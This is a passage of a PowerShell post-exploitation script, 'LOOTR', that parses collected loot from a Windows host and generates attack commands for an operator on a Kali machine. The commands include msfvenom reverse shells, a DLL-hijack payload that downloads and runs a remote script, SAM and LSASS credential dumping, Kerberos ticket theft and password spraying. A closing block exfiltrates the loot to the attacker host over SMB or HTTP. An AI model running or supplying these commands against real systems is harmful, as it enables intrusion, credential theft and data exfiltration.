    # ── Writable Service Binaries ─────────────────────────────────────────────
    $wsPath = Join-Path $LootDir "files\writable_service_binaries.txt"
    if (Test-Path $wsPath) {
        $wsContent = Get-Content $wsPath -ErrorAction SilentlyContinue | Where-Object { $_ -match "WRITABLE" }
        if ($wsContent) {
            $HasActions = $true
            $null = $sb.AppendLine("[ WRITABLE SERVICE BINARIES ]")
            foreach ($bin in $wsContent | Select-Object -First 3) {
                $null = $sb.AppendLine("  $bin")
                # Format: "WRITABLE SERVICE BINARY: C:\path\binary.exe (ServiceName)"
                $binPath = [regex]::Match($bin, 'BINARY:\s*(.+?)\s*\(').Groups[1].Value.Trim()
                $svcName = [regex]::Match($bin, '\(([^)]+)\)$').Groups[1].Value.Trim()
                if (-not $svcName) { $svcName = "<ServiceName>" }
                if (-not $binPath) { $binPath = "<SERVICE_BINARY_PATH>" }
                $null = $sb.AppendLine("  # On Kali — start listener first:")
                $null = $sb.AppendLine("  penelope -p 4444 -O")
                $null = $sb.AppendLine("  # Option A — msfvenom EXE (costs your 1 MSF use):")
                $null = $sb.AppendLine("  msfvenom -p windows/x64/shell_reverse_tcp LHOST=$KaliIp LPORT=4444 -f exe -o shell.exe")
                $null = $sb.AppendLine("  # Option B — manual EXE revshell (no MSF): see [ UNQUOTED SERVICE PATHS ] for the mingw C source")
                $null = $sb.AppendLine("  # x86_64-w64-mingw32-gcc revshell.c -o shell.exe -lws2_32")
                $null = $sb.AppendLine("  copy shell.exe '$binPath'")
                $null = $sb.AppendLine("  sc stop $svcName ; sc start $svcName")
            }
            $null = $sb.AppendLine("")
        }
    }

    # ── DLL Hijack Candidates ─────────────────────────────────────────────────
    $dllPath = Join-Path $LootDir "files\dll_hijack_candidates.txt"
    if (Test-Path $dllPath) {
        $dllContent = Get-Content $dllPath -ErrorAction SilentlyContinue | Where-Object { $_ -match "WRITABLE" }
        if ($dllContent) {
            $HasActions = $true
            $null = $sb.AppendLine("[ DLL HIJACK — WRITABLE DIRECTORY ]")
            foreach ($d in $dllContent | Select-Object -First 3) {
                $null = $sb.AppendLine("  $d")
            }
            $null = $sb.AppendLine("  # On Kali — start listener first:")
            $null = $sb.AppendLine("  penelope -p 4444 -O")
            $null = $sb.AppendLine("  # Option A — msfvenom DLL (costs your 1 MSF use):")
            $null = $sb.AppendLine("  msfvenom -p windows/x64/shell_reverse_tcp LHOST=$KaliIp LPORT=4444 -f dll -o hijack.dll")
            $null = $sb.AppendLine("  # Option B — manual DLL with mingw (no MSF):")
            $null = $sb.AppendLine("  cat > hijack.c <<'EOF'")
            $null = $sb.AppendLine("  #include <windows.h>")
            $null = $sb.AppendLine("  BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID p){")
            $null = $sb.AppendLine('    if(r==DLL_PROCESS_ATTACH) WinExec("cmd.exe /c powershell -c \"IEX(New-Object Net.WebClient).DownloadString(''http://' + $KaliIp + '/r.ps1'')\"",0);')
            $null = $sb.AppendLine("    return TRUE; }")
            $null = $sb.AppendLine("  EOF")
            $null = $sb.AppendLine("  x86_64-w64-mingw32-gcc -shared hijack.c -o hijack.dll")
            $null = $sb.AppendLine("  # Serve r.ps1 (nishang Invoke-PowerShellTcp.ps1) via ./servr.sh http")
            $null = $sb.AppendLine("  # Drop in writable directory with correct DLL name, restart service/app")
            $null = $sb.AppendLine("")
        }
    }

    # ── SeBackup / SeRestore — SAM dump via reg save ─────────────────────────
    if (Test-Path $privPath) {
        $privContent = Get-Content $privPath -ErrorAction SilentlyContinue
        $hasBackup = $privContent | Select-String "SeBackupPrivilege|SeRestorePrivilege"
        if ($hasBackup) {
            $HasActions = $true
            $null = $sb.AppendLine("[ SeBackupPrivilege / SeRestorePrivilege — SAM/SYSTEM DUMP ]")
            $null = $sb.AppendLine("  # Bypasses ACL checks — can read SAM/SYSTEM even as a non-admin user.")
            $null = $sb.AppendLine("  # Step 1: dump hives on target (must enable the privilege in the token):")
            $null = $sb.AppendLine("  reg save HKLM\SAM    C:\Windows\Temp\sam.save")
            $null = $sb.AppendLine("  reg save HKLM\SYSTEM C:\Windows\Temp\sys.save")
            $null = $sb.AppendLine("  # If 'reg save' reports 'Access denied', try via robocopy with /B (backup mode):")
            $null = $sb.AppendLine("  #   robocopy /B C:\Windows\System32\config C:\Windows\Temp SAM SYSTEM")
            $null = $sb.AppendLine("  # Step 2: exfil both files to Kali ($KaliIp), then:")
            $null = $sb.AppendLine("  impacket-secretsdump -sam sam.save -system sys.save LOCAL")
            $null = $sb.AppendLine("  # Step 3: crack NT hashes with crackr.sh:")
            $null = $sb.AppendLine("  ./crackr.sh -f /tmp/nt_hashes.txt   # -m 1000 for NTLM")
            $null = $sb.AppendLine("")
        }
    }

    # ── Kerberos tickets ─────────────────────────────────────────────────────
    $krbPath = Join-Path $LootDir "creds\kerberos.txt"
    if (Test-Path $krbPath) {
        $krbContent = Get-Content $krbPath -Raw -ErrorAction SilentlyContinue
        if ($krbContent -match "Server:|#\d+>") {
            $HasActions = $true
            $null = $sb.AppendLine("[ KERBEROS TICKETS PRESENT ]")
            $null = $sb.AppendLine("  # Current session has Kerberos tickets — can lateral-move without passwords.")
            $null = $sb.AppendLine("  # Review: type $krbPath")
            $null = $sb.AppendLine("")
            $null = $sb.AppendLine("  # Option A — dump all tickets with Rubeus:")
            $null = $sb.AppendLine("  Rubeus.exe dump /nowrap")
            $null = $sb.AppendLine("  Rubeus.exe dump /luid:0x3e7 /nowrap   # SYSTEM session (needs admin)")
            $null = $sb.AppendLine("  # Option B — export ccache and use from Kali:")
            $null = $sb.AppendLine("  Rubeus.exe dump /service:krbtgt /nowrap   # base64 .kirbi")
            $null = $sb.AppendLine("  # On Kali:")
            $null = $sb.AppendLine("  #   echo '<b64>' | base64 -d > ticket.kirbi")
            $null = $sb.AppendLine("  #   impacket-ticketConverter ticket.kirbi ticket.ccache")
            $null = $sb.AppendLine("  #   export KRB5CCNAME=`$(pwd)/ticket.ccache")
            $null = $sb.AppendLine("  #   impacket-psexec -k -no-pass <DOMAIN>/<USER>@<DC_FQDN>")
            $null = $sb.AppendLine("")
        }
    }

    # ── LSASS dump (needs SeDebugPrivilege / admin / SYSTEM) ────────────────
    $privPath = Join-Path $LootDir "creds\privileges.txt"
    if (Test-Path $privPath) {
        $privContent = Get-Content $privPath -Raw -ErrorAction SilentlyContinue
        if ($privContent -match "SeDebugPrivilege.*Enabled|SeImpersonatePrivilege.*Enabled|SeTcbPrivilege.*Enabled") {
            $HasActions = $true
            $null = $sb.AppendLine("[ LSASS DUMP — CREDENTIAL HARVEST ]")
            $null = $sb.AppendLine("  # Admin/SYSTEM privileges detected — dump LSASS for cached plaintext/NTLM/Kerberos creds.")
            $null = $sb.AppendLine("")
            $null = $sb.AppendLine("  # Option A — mimikatz (fastest, parses in-process):")
            $null = $sb.AppendLine("  .\mimikatz.exe `"privilege::debug`" `"sekurlsa::logonpasswords`" `"sekurlsa::tickets /export`" `"exit`"")
            $null = $sb.AppendLine("")
            $null = $sb.AppendLine("  # Option B — comsvcs.dll MiniDump (built-in, no 3rd-party binary):")
            $null = $sb.AppendLine("  `$lsassPid = (Get-Process lsass).Id")
            $null = $sb.AppendLine("  rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump `$lsassPid C:\Windows\Temp\lsass.dmp full")
            $null = $sb.AppendLine("  # Then exfil lsass.dmp to Kali:")
            $null = $sb.AppendLine("  #   pypykatz lsa minidump lsass.dmp")
            $null = $sb.AppendLine("")
            $null = $sb.AppendLine("  # Option C — procdump (sysinternals):")
            $null = $sb.AppendLine("  procdump.exe -accepteula -ma lsass.exe C:\Windows\Temp\lsass.dmp")
            $null = $sb.AppendLine("")
            $null = $sb.AppendLine("  # WDigest plaintext (if UseLogonCredential=1 or missing):")
            $null = $sb.AppendLine("  reg query HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential")
            $null = $sb.AppendLine("  # If enabled → next logon caches plaintext → re-dump LSASS")
            $null = $sb.AppendLine("")
        }
    }

    # ── DPAPI blobs + masterkeys ─────────────────────────────────────────────
    $dpPath = Join-Path $LootDir "creds\dpapi_files.txt"
    if (Test-Path $dpPath) {
        $dpContent = Get-Content $dpPath -ErrorAction SilentlyContinue | Where-Object { $_ -match "\S" }
        if ($dpContent) {
            $HasActions = $true
            $null = $sb.AppendLine("[ DPAPI BLOBS + MASTERKEYS ]")
            $null = $sb.AppendLine("  # DPAPI files found (saved browser/RDP creds, vault, etc). Decrypt requires:")
            $null = $sb.AppendLine("  #   (a) user's masterkey (AppData\Roaming\Microsoft\Protect\<SID>\<GUID>)")
            $null = $sb.AppendLine("  #   (b) user's logon password OR SHA1 hash OR NTLM hash OR plaintext")
            $null = $sb.AppendLine("")
            $null = $sb.AppendLine("  # Sample files (see $dpPath for full list):")
            foreach ($dpf in $dpContent | Select-Object -First 5) {
                $null = $sb.AppendLine("    $dpf")
            }
            $null = $sb.AppendLine("")
            $null = $sb.AppendLine("  # Decrypt with SharpDPAPI on target (manual — not auto-run):")
            $null = $sb.AppendLine("  #   SharpDPAPI.exe credentials")
            $null = $sb.AppendLine("  #   SharpDPAPI.exe masterkeys")
            $null = $sb.AppendLine("  #   SharpDPAPI.exe rdg   # saved RDP targets")
            $null = $sb.AppendLine("  # Or decrypt offline on Kali with pypykatz (after exfil):")
            $null = $sb.AppendLine("  #   pypykatz dpapi masterkey <masterkey_file> --password '<user_pass>'")
            $null = $sb.AppendLine("  #   pypykatz dpapi cred <blob> --masterkey <masterkey_hex>")
            $null = $sb.AppendLine("")
        }
    }

    # ── GPP cpassword (MS14-025) ─────────────────────────────────────────────
    $gppPath = Join-Path $LootDir "creds\gpp_cpassword.txt"
    if (Test-Path $gppPath) {
        $gppContent = Get-Content $gppPath -ErrorAction SilentlyContinue | Where-Object { $_ -match "CPASSWORD FOUND" }
        if ($gppContent) {
            $HasActions = $true
            $null = $sb.AppendLine("[ GPP cpassword — MS14-025 ]")
            $null = $sb.AppendLine("  # cpassword attribute uses a Microsoft-published AES-256 key — trivial to decrypt.")
            $null = $sb.AppendLine("  # Files (saved to loot\creds\gpp_*):")
            foreach ($gh in $gppContent | Select-Object -First 5) {
                $null = $sb.AppendLine("    $gh")
            }
            $null = $sb.AppendLine("")
            $null = $sb.AppendLine("  # Decrypt on Kali:")
            $null = $sb.AppendLine("  gpp-decrypt <CPASSWORD_VALUE>")
            $null = $sb.AppendLine("  # Then feed the plaintext into sprayr.sh:")
            $null = $sb.AppendLine("  ./sprayr.sh -u '<USER_FROM_XML>' -p '<DECRYPTED>' -t $ThisHostIp")
            $null = $sb.AppendLine("  ./sprayr.sh --from-creds   # after adding to ~/toolkit/creds.txt")
            $null = $sb.AppendLine("")
        }
    }

    # ── Stored Credentials (cmdkey) ───────────────────────────────────────────
    $ckPath = Join-Path $LootDir "creds\cmdkey_list.txt"
    if (Test-Path $ckPath) {
        $ckContent = Get-Content $ckPath -ErrorAction SilentlyContinue | Select-String "Target:|User:"
        if ($ckContent) {
            $HasActions = $true
            $null = $sb.AppendLine("[ STORED CREDENTIALS (cmdkey) ]")
            $ckContent | ForEach-Object { $null = $sb.AppendLine("  $_") }
            $null = $sb.AppendLine("  # Use stored creds without knowing the password:")
            $null = $sb.AppendLine("  runas /savecred /user:<StoredUser> cmd.exe")
            $null = $sb.AppendLine("  # Or use RunasCs (pass-the-stored-cred):")
            $null = $sb.AppendLine("  RunasCs.exe <user> <pass> cmd.exe -b")
            $null = $sb.AppendLine("")
        }
    }

    # ── Scheduled Tasks (writable binary) ────────────────────────────────────
    $stPath = Join-Path $LootDir "files\writable_scheduled_task_binaries.txt"
    if (Test-Path $stPath) {
        $stContent = Get-Content $stPath -ErrorAction SilentlyContinue |
            Where-Object { $_ -match "WRITABLE SCHEDULED TASK BINARY" } |
            Select-Object -First 5
        if ($stContent) {
            $HasActions = $true
            $null = $sb.AppendLine("[ WRITABLE SCHEDULED TASK BINARIES ]")
            $stContent | ForEach-Object { $null = $sb.AppendLine("  $_") }
            $null = $sb.AppendLine("  # On Kali start listener, then overwrite the writable task binary and wait for trigger:")
            $null = $sb.AppendLine("  penelope -p 4444 -O")
            $null = $sb.AppendLine("  # Option A — msfvenom EXE (costs your 1 MSF use):")
            $null = $sb.AppendLine("  msfvenom -p windows/x64/shell_reverse_tcp LHOST=$KaliIp LPORT=4444 -f exe -o shell.exe")
            $null = $sb.AppendLine("  # Option B — manual EXE revshell (no MSF): see [ UNQUOTED SERVICE PATHS ] for the mingw C source")
            $null = $sb.AppendLine("  # x86_64-w64-mingw32-gcc revshell.c -o shell.exe -lws2_32")
            $null = $sb.AppendLine("  copy shell.exe '<WRITABLE_TASK_BINARY_PATH>'")
            $null = $sb.AppendLine("")
        }
    }

    # ── AutoLogon Credentials ─────────────────────────────────────────────────
    $alPath = Join-Path $LootDir "creds\autologon.txt"
    if (Test-Path $alPath) {
        $alContent = Get-Content $alPath -ErrorAction SilentlyContinue | Where-Object { $_ -match "\S" }
        if ($alContent | Select-String "DefaultPassword|DefaultUserName") {
            $HasActions = $true
            $alUser = ($alContent | Select-String "DefaultUserName" | Select-Object -First 1) -replace ".*REG_SZ\s+", ""
            $alPass = ($alContent | Select-String "DefaultPassword" | Select-Object -First 1) -replace ".*REG_SZ\s+", ""
            $null = $sb.AppendLine("[ AUTOLOGON CREDENTIALS FOUND ]")
            $alContent | ForEach-Object { $null = $sb.AppendLine("  $_") }
            $null = $sb.AppendLine("  # Spray on Kali:")
            $null = $sb.AppendLine("  ./sprayr.sh -u '$alUser' -p '$alPass' -t $ThisHostIp")
            $null = $sb.AppendLine("  # Escalate locally using RunasCs:")
            $null = $sb.AppendLine("  RunasCs.exe $alUser $alPass cmd.exe -b")
            $null = $sb.AppendLine("")
        }
    }

    # ── PowerShell History ────────────────────────────────────────────────────
    $psHistPath = Join-Path $LootDir "creds\powershell_history.txt"
    if (Test-Path $psHistPath) {
        $psContent = Get-Content $psHistPath -ErrorAction SilentlyContinue |
            Select-String -Pattern "pass|password|cred|secret|key|token|bearer|authorization|ConvertTo-SecureString|-p\s" -CaseSensitive:$false |
            Select-Object -First 20
        if ($psContent) {
            $HasActions = $true
            $null = $sb.AppendLine("[ POWERSHELL HISTORY — CREDENTIAL PATTERNS ]")
            $psContent | ForEach-Object { $null = $sb.AppendLine("  $_") }
            $null = $sb.AppendLine("  # Extract password from lines above, then spray on Kali:")
            $null = $sb.AppendLine("  ./sprayr.sh -u '$env:USERNAME' -p '<PASS_FROM_HISTORY>' -t $ThisHostIp")
            $null = $sb.AppendLine("")
        }
    }

    # ── Internal Listeners (pivot candidates) ─────────────────────────────────
    $ilPath = Join-Path $LootDir "network\internal_listeners.txt"
    if (Test-Path $ilPath) {
        $ilContent = Get-Content $ilPath -ErrorAction SilentlyContinue | Where-Object { $_ -match "127\.0\.0\.1|0\.0\.0\.0" }
        if ($ilContent) {
            $HasActions = $true
            $null = $sb.AppendLine("[ INTERNAL LISTENERS — PIVOT CANDIDATES ]")
            $null = $sb.AppendLine("  # On Kali, forward each internal port via pivotr.sh:")
            foreach ($il in $ilContent | Select-Object -First 10) {
                $null = $sb.AppendLine("  $il")
                $port = [regex]::Match($il.ToString(), ':(\d+)\s').Groups[1].Value
                if ($port) {
                    $null = $sb.AppendLine("  ./pivotr.sh ssh --type local --pivot-ip $ThisHostIp --target-ip 127.0.0.1 --target-port $port")
                    $null = $sb.AppendLine("  # Or chisel: ./pivotr.sh chisel --type forward --target-ip 127.0.0.1 --target-port $port")
                }
            }
            $null = $sb.AppendLine("")
        }
    }

    # ── Reachable Subnets ─────────────────────────────────────────────────────
    # Query live — more reliable than parsing the saved Format-Table text.
    $nicList = Get-NetIPAddress -AddressFamily IPv4 -ErrorAction SilentlyContinue |
        Where-Object { $_.IPAddress -notmatch '^(127\.|169\.254\.)' }
    if ($nicList) {
        $HasActions = $true
        $null = $sb.AppendLine("[ NETWORK INTERFACES — PIVOT TARGETS ]")
        foreach ($nic in $nicList) {
            # Compute network address: zero out host bits
            $ipBytes  = [System.Net.IPAddress]::Parse($nic.IPAddress).GetAddressBytes()
            $prefix   = $nic.PrefixLength
            $maskBytes = [byte[]]@(0,0,0,0)
            for ($i = 0; $i -lt 4; $i++) {
                $bits = [Math]::Max(0, [Math]::Min(8, $prefix - $i * 8))
                $maskBytes[$i] = if ($bits -ge 8) { 255 } elseif ($bits -le 0) { 0 } else { [byte](256 - [Math]::Pow(2, 8 - $bits)) }
            }
            $netBytes = for ($i = 0; $i -lt 4; $i++) { $ipBytes[$i] -band $maskBytes[$i] }
            $subnet   = ($netBytes -join '.') + "/$prefix"
            $null = $sb.AppendLine("  $($nic.InterfaceAlias): $($nic.IPAddress)/$prefix  (subnet: $subnet)")
            $null = $sb.AppendLine("  ./pivotr.sh ligolo --pivot-ip $ThisHostIp --subnet $subnet --serve")
        }
        $null = $sb.AppendLine("")
    }

    if (-not $HasActions) {
        $null = $sb.AppendLine("  No high-value findings to generate commands for.")
        $null = $sb.AppendLine("  Review summary.txt and the loot\ subdirectories manually.")
    }

    $null = $sb.AppendLine("============================================================")
    $sb.ToString() | Out-File -Encoding UTF8 $AFile
    $sb.ToString() | Out-File -Encoding UTF8 $NFile
    Write-Success "Attack commands written -> $AFile"
    Write-Success "Next steps alias written -> $NFile"
    Write-Host ""
    Get-Content $AFile | Write-Host
}

#==============================================================================
# MAIN
#==============================================================================
Write-Host ""
Write-Host "  LOOTR — Post-Exploitation Loot Collection (Windows)" -ForegroundColor Cyan
Write-Host "  Enumeration/collection only — no exploitation" -ForegroundColor Cyan
Write-Host ""

if ($Phase -ne "") {
    switch ($Phase.ToLower()) {
        "proof"   { Invoke-PhaseProof }
        "system"  { Invoke-PhaseSystem }
        "creds"   { Invoke-PhaseCredential }
        "network" { Invoke-PhaseNetwork }
        "files"   { Invoke-PhaseFile }
    }
} else {
    Invoke-PhaseProof
    Invoke-PhaseSystem
    Invoke-PhaseCredential
    Invoke-PhaseNetwork
    if (-not $Quick) {
        Invoke-PhaseFile
    } else {
        Write-Warn "Skipping files phase (Quick mode)"
    }
}

Invoke-Summary
Invoke-AttackCommands

Write-Host ""
Write-Success "Loot collection complete. Output: $LootDir\"
Write-Success "Quick review:      Get-Content $LootDir\summary.txt"
Write-Success "Next steps:        Get-Content $LootDir\next_steps.txt"
Write-Success "Attack commands:   Get-Content $LootDir\attack_commands.txt"

Write-Host ""
Write-Host "[NEXT STEPS]" -ForegroundColor Cyan
Write-Host "  1. Exfil loot to Kali ($KaliIp) — pick one method:" -ForegroundColor White
Write-Host "       # SMB (if servr.sh smb is running on Kali):" -ForegroundColor Gray
Write-Host "       copy $LootDir\* \\$KaliIp\share\" -ForegroundColor Green
Write-Host "       # HTTP POST (if Kali has an upload endpoint):" -ForegroundColor Gray
Write-Host "       Compress-Archive $LootDir $env:TEMP\loot.zip; iwr -Uri http://${KaliIp}/upload -Method POST -InFile $env:TEMP\loot.zip" -ForegroundColor Green
Write-Host "  2. Start listener for any reverse shell triggers in next_steps.txt:" -ForegroundColor White
Write-Host "       penelope -p 4444 -O" -ForegroundColor Green
Write-Host "  3. Crack any SAM / NTLM hashes found on Kali:" -ForegroundColor White
Write-Host "       ./crackr.sh -f <loot_dir>/creds/sam_hashes.txt" -ForegroundColor Green
Write-Host "  4. Spray any found credentials on Kali:" -ForegroundColor White
Write-Host "       ./sprayr.sh --from-creds" -ForegroundColor Green
Write-Host "  5. Read prioritised next steps:" -ForegroundColor White
Write-Host "       type $LootDir\next_steps.txt" -ForegroundColor Green
Write-Host ""
